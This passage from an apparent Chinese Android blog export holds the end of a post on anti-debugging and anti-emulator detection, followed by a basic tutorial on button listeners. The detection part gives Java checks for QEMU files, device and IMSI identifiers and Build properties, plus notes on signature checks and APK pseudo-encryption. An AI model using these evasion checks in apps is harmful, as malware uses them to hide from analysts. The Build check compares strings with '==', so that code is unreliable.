checkPipes()&#123;</span><br><span class="line">        for(int i &#x3D; 0; i &lt; known_pipes.length; i++)&#123;</span><br><span class="line">            String pipes &#x3D; known_pipes[i];</span><br><span class="line">            File qemu_socket &#x3D; new File(pipes);</span><br><span class="line">            if(qemu_socket.exists())&#123;</span><br><span class="line">                Log.v(&quot;Result:&quot;, &quot;Find pipes!&quot;);</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Log.i(&quot;Result:&quot;, &quot;Not Find pipes!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; 检测驱动文件内容</span><br><span class="line">    &#x2F;&#x2F; 读取文件内容，然后检查已知QEmu的驱动程序的列表</span><br><span class="line">    public static Boolean checkQEmuDriverFile()&#123;</span><br><span class="line">        File driver_file &#x3D; new File(&quot;&#x2F;proc&#x2F;tty&#x2F;drivers&quot;);</span><br><span class="line">        if(driver_file.exists() &amp;&amp; driver_file.canRead())&#123;</span><br><span class="line">            byte[] data &#x3D; new byte[1024];  &#x2F;&#x2F;(int)driver_file.length()</span><br><span class="line">            try &#123;</span><br><span class="line">                InputStream inStream &#x3D; new FileInputStream(driver_file);</span><br><span class="line">                inStream.read(data);</span><br><span class="line">                inStream.close();       </span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">                &#x2F;&#x2F; TODO: handle exception</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            String driver_data &#x3D; new String(data);</span><br><span class="line">            for(String known_qemu_driver : AntiEmulator.known_qemu_drivers)&#123;</span><br><span class="line">                if(driver_data.indexOf(known_qemu_driver) !&#x3D; -1)&#123;</span><br><span class="line">                    Log.i(&quot;Result:&quot;, &quot;Find know_qemu_drivers!&quot;);</span><br><span class="line">                    return true;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Log.i(&quot;Result:&quot;, &quot;Not Find known_qemu_drivers!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;检测模拟器上特有的几个文件</span><br><span class="line">    public static Boolean CheckEmulatorFiles()&#123;</span><br><span class="line">        for(int i &#x3D; 0; i &lt; known_files.length; i++)&#123;</span><br><span class="line">            String file_name &#x3D; known_files[i];</span><br><span class="line">            File qemu_file &#x3D; new File(file_name);</span><br><span class="line">            if(qemu_file.exists())&#123;</span><br><span class="line">                Log.v(&quot;Result:&quot;, &quot;Find Emulator Files!&quot;);</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Log.v(&quot;Result:&quot;, &quot;Not Find Emulator Files!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 检测模拟器默认的电话号码</span><br><span class="line">    public static Boolean CheckPhoneNumber(Context context) &#123;</span><br><span class="line">        TelephonyManager telephonyManager &#x3D; (TelephonyManager) context</span><br><span class="line">                .getSystemService(Context.TELEPHONY_SERVICE);</span><br><span class="line"></span><br><span class="line">        String phonenumber &#x3D; telephonyManager.getLine1Number();</span><br><span class="line"></span><br><span class="line">        for (String number : known_numbers) &#123;</span><br><span class="line">            if (number.equalsIgnoreCase(phonenumber)) &#123;</span><br><span class="line">                Log.v(&quot;Result:&quot;, &quot;Find PhoneNumber!&quot;);</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Log.v(&quot;Result:&quot;, &quot;Not Find PhoneNumber!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;检测设备IDS 是不是 “000000000000000”</span><br><span class="line">    public static Boolean CheckDeviceIDS(Context context) &#123;</span><br><span class="line">        TelephonyManager telephonyManager &#x3D; (TelephonyManager) context</span><br><span class="line">                .getSystemService(Context.TELEPHONY_SERVICE);</span><br><span class="line"></span><br><span class="line">        String device_ids &#x3D; telephonyManager.getDeviceId();</span><br><span class="line"></span><br><span class="line">        for (String know_deviceid : known_device_ids) &#123;</span><br><span class="line">            if (know_deviceid.equalsIgnoreCase(device_ids)) &#123;</span><br><span class="line">                Log.v(&quot;Result:&quot;, &quot;Find ids: 000000000000000!&quot;);</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Log.v(&quot;Result:&quot;, &quot;Not Find ids: 000000000000000!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 检测imsi id是不是“310260000000000”</span><br><span class="line">    public static Boolean CheckImsiIDS(Context context)&#123;</span><br><span class="line">        TelephonyManager telephonyManager &#x3D; (TelephonyManager)</span><br><span class="line">                context.getSystemService(Context.TELEPHONY_SERVICE);</span><br><span class="line"></span><br><span class="line">        String imsi_ids &#x3D; telephonyManager.getSubscriberId();</span><br><span class="line"></span><br><span class="line">        for (String know_imsi : known_imsi_ids) &#123;</span><br><span class="line">            if (know_imsi.equalsIgnoreCase(imsi_ids)) &#123;</span><br><span class="line">                Log.v(&quot;Result:&quot;, &quot;Find imsi ids: 310260000000000!&quot;);</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Log.v(&quot;Result:&quot;, &quot;Not Find imsi ids: 310260000000000!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;检测手机上的一些硬件信息</span><br><span class="line">    public static Boolean CheckEmulatorBuild(Context context)&#123;</span><br><span class="line">        String BOARD &#x3D; android.os.Build.BOARD;</span><br><span class="line">        String BOOTLOADER &#x3D; android.os.Build.BOOTLOADER;</span><br><span class="line">        String BRAND &#x3D; android.os.Build.BRAND;</span><br><span class="line">        String DEVICE &#x3D; android.os.Build.DEVICE;</span><br><span class="line">        String HARDWARE &#x3D; android.os.Build.HARDWARE;</span><br><span class="line">        String MODEL &#x3D; android.os.Build.MODEL;</span><br><span class="line">        String PRODUCT &#x3D; android.os.Build.PRODUCT;</span><br><span class="line">        if (BOARD &#x3D;&#x3D; &quot;unknown&quot; || BOOTLOADER &#x3D;&#x3D; &quot;unknown&quot;</span><br><span class="line">                || BRAND &#x3D;&#x3D; &quot;generic&quot; || DEVICE &#x3D;&#x3D; &quot;generic&quot;</span><br><span class="line">                || MODEL &#x3D;&#x3D; &quot;sdk&quot; || PRODUCT &#x3D;&#x3D; &quot;sdk&quot;</span><br><span class="line">                || HARDWARE &#x3D;&#x3D; &quot;goldfish&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            Log.v(&quot;Result:&quot;, &quot;Find Emulator by EmulatorBuild!&quot;);</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        Log.v(&quot;Result:&quot;, &quot;Not Find Emulator by EmulatorBuild!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;检测手机运营商家</span><br><span class="line">    public static boolean CheckOperatorNameAndroid(Context context) &#123;</span><br><span class="line">        String szOperatorName &#x3D; ((TelephonyManager)</span><br><span class="line">                context.getSystemService(&quot;phone&quot;)).getNetworkOperatorName();</span><br><span class="line"></span><br><span class="line">        if (szOperatorName.toLowerCase().equals(&quot;android&quot;) &#x3D;&#x3D; true) &#123;</span><br><span class="line">            Log.v(&quot;Result:&quot;, &quot;Find Emulator by OperatorName!&quot;);</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        Log.v(&quot;Result:&quot;, &quot;Not Find Emulator by OperatorName!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>也可以检测一些其他的值，如电池的电池状态，电池电量，Secure.ANDROIOD_ID,Deviceid,手机号码等。</p>
</blockquote>
<h3 id="虚拟机文件检测"><a href="#虚拟机文件检测" class="headerlink" title="虚拟机文件检测"></a>虚拟机文件检测</h3><blockquote>
<p>相对于真实设备，上述的检测手段不再适用。安卓模拟器中存在一些特殊的文件或者目录，如/system/bin/qemu-props,该可执行文件可以用来在模拟器中设置系统属性。常用的模拟器都会进行一定程度的定制，这样都会有些带有该型号文件特征的文件，比如海马玩在system/bin下就有一个droid4x-prop,夜神模拟器在system/bin路径下有nox-prop。一般的手机上不会有这一文件，这可以作为一个思路来进行检测。</p>
</blockquote>
</li>
</ol>
<table>
<thead>
<tr>
<th align="center">检测列表</th>
</tr>
</thead>
<tbody><tr>
<td align="center">/system/lib/libc_malloc_debug_qemu.so</td>
</tr>
<tr>
<td align="center">/system/lib/libc_malloc_debug_qemu.so-arm</td>
</tr>
<tr>
<td align="center">/system/bin/qemu_props</td>
</tr>
<tr>
<td align="center">/system/bin/androVM-prop</td>
</tr>
<tr>
<td align="center">/system/bin/microvirt-prop</td>
</tr>
<tr>
<td align="center">/system/bin/windroyed(文卓爷模拟器)</td>
</tr>
<tr>
<td align="center">/system/bin/microvirt</td>
</tr>
<tr>
<td align="center">/system/bin/nox-prop(夜神模拟器)</td>
</tr>
<tr>
<td align="center">/system/bin/ttVM-prop(天天模拟器)</td>
</tr>
<tr>
<td align="center">/system/bin/droid4x-prop(海马玩模拟器)</td>
</tr>
<tr>
<td align="center">### 基于cache行为检测</td>
</tr>
</tbody></table>
<blockquote>
<p>cache原理模拟器和真机是有所不同，真机的cache模块是分区的，模拟器的是没有分区，是一整个cache。</p>
</blockquote>
<h2 id="res层面"><a href="#res层面" class="headerlink" title="res层面"></a>res层面</h2><h3 id="资源检测防止重打包"><a href="#资源检测防止重打包" class="headerlink" title="资源检测防止重打包"></a>资源检测防止重打包</h3><blockquote>
<p>SDK中提供了检测软件签名的方法，可以调用PackageManager类的getPackageInfo()方法，为第2个参数传入PackageManager.GET_SIGNATURES,返回的PackageInfo对象的signature字段就是软件发布时的签名，但签名内容过长，不适合在代码中作比较，可以使用签名对象的hashcode()方法来获取hash值，比较hash值即可。<br>可以有两种方案：</p>
</blockquote>
<ul>
<li>直接在 java代码中实现，签名不一致则退出应用。</li>
<li>将签名信息携带有关参数，发送到服务端进行签名校验，失败就返回错误。<br>虽然有这些签名校验的存在，但始终可以在本地解决。但也是一种方案。<h3 id="使用伪加密"><a href="#使用伪加密" class="headerlink" title="使用伪加密"></a>使用伪加密</h3><blockquote>
<p>伪加密是Android4.2.x系统发布前的加密方式之一，通过java代码对APK(压缩文件)进行伪加密，其修改原理是修改连续4位字节标记为”P K 01 02”的后第5位字节，奇数表示不加密偶数表示加密。伪加密后的APK不但可以防止PC端对它的解压和查看也同样能防止反编译工具编译。</p>
</blockquote>
</li>
</ul>
<hr>
<blockquote>
<p>虽然伪加密可以起到一定防破解作用，但同时会出现这样的问题，首先使用伪加密对其APK加密后市场无法对其进行安全检测，导致部分市场会拒绝这类APK上 传；其次，伪加密的加密方式和解密方式也早已公布导致它的安全程度也大大降低；再次，Android4.2.x系统无法安装伪加密的APK；最后伪加密只 是对APK做简单保护，在java层源码加壳保护、核心so库、资源文件、主配文件、第三方架包方面却没有任何保护处理。因此APK伪加密是无法真正有效的防破解</p>
</blockquote>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
<p>上述的一些反调试方法很大程度参考了网上一些大佬的博客，有些可能已经不再适用。但作为菜鸟几天的学习收获，了解到了很多有用的知识。虽然总结的很繁琐，但挺值得。继续努力吧！</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/two_dimen.png" alt="博客链接" title="博客链接"></p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.csdn.net/feibabeibei_beibei/article/details/60956307" target="_blank" rel="noopener">https://blog.csdn.net/feibabeibei_beibei/article/details/60956307</a><br><a href="https://blog.csdn.net/darmao/article/details/78816964" target="_blank" rel="noopener">https://blog.csdn.net/darmao/article/details/78816964</a><br><a href="https://blog.csdn.net/iEearth/article/details/72849990" target="_blank" rel="noopener">https://blog.csdn.net/iEearth/article/details/72849990</a><br><a href="https://www.ibm.com/developerworks/cn/linux/l-inotify/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/l-inotify/index.html</a><br><a href="https://blog.csdn.net/earbao/article/details/53933306" target="_blank" rel="noopener">https://blog.csdn.net/earbao/article/details/53933306</a></p>
]]></content>
      <categories>
        <category>理论学习</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>反调试</tag>
      </tags>
  </entry>
  <entry>
    <title>安卓设置按钮监听的四种方式</title>
    <url>/2018/03/14/%E5%AE%89%E5%8D%93%E8%AE%BE%E7%BD%AE%E6%8C%89%E9%92%AE%E7%9B%91%E5%90%AC%E7%9A%84%E5%9B%9B%E7%A7%8D%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<p>这里的布局文件就很简单。只是一个简单的按钮。ID为button1。</p>
<p>第一种：</p>
<a id="more"></a>
<p>1.找到按钮的Id.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Button button&#x3D; (Button) findViewById(R.id.button1);</span><br><span class="line">button.setOnClickListener(this);</span><br><span class="line">但this指的是当前的activity,会报错。ALT+enter键实现View.OnClickListener接口。会自动实现click方法。源码如下：</span><br><span class="line">public class MainActivity extends AppCompatActivity implements View.OnClickListener &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.clicklayout);</span><br><span class="line">        Button button&#x3D; (Button) findViewById(R.id.button1);</span><br><span class="line">        button.setOnClickListener(this);</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void onClick(View v) &#123;</span><br><span class="line">        Toast.makeText(MainActivity.this,&quot;@@@@@@@@@&quot;,Toast.LENGTH_LONG).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第二种：</p>
<blockquote>
<p>同样需要找到按钮的Id<br>Button button= (Button) findViewById(R.id.button1);<br>利用button设置监听，并实现onclick方法。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class MainActivity extends AppCompatActivity  &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.clicklayout);</span><br><span class="line">        Button button&#x3D; (Button) findViewById(R.id.button1);</span><br><span class="line">        button.setOnClickListener(new View.OnClickListener() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void onClick(View v) &#123;</span><br><span class="line">                Toast.makeText(MainActivity.this,&quot;@@@@@@@@@&quot;,Toast.LENGTH_LONG).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第三种：</p>
<blockquote>
<p>这种方法要通过布局文件来实现。在&lt;Button 内容/&gt;中添加android:onclick=”click123”。click123可任意设定，是要实现的方法名。<br>然后在Mainactivity中实现click123方法。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class MainActivity extends AppCompatActivity  &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.clicklayout);</span><br><span class="line">    &#125;</span><br><span class="line">    public void click123(View v)&#123;</span><br><span class="line">        Toast.makeText(MainActivity.this,&quot;@@@@@@@@@&quot;,Toast.LENGTH_LONG).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第四种：</p>
<blockquote>
<p>以内部类的方式来实现。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class MainActivity extends AppCompatActivity  &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.clicklayout);</span><br><span class="line">        Button button&#x3D; (Button) findViewById(R.id.button1);</span><br><span class="line">        button.setOnClickListener(new myclick());</span><br><span class="line">    &#125;</span><br><span class="line">    class myclick implements View.OnClickListener&#123;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void onClick(View v) &#123;</span><br><span class="line">            Toast.makeText(MainActivity.this,&quot;@@@@@@@@@&quot;,Toast.LENGTH_LONG).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>按钮监听</tag>
      </tags>
  </entry>
</search>
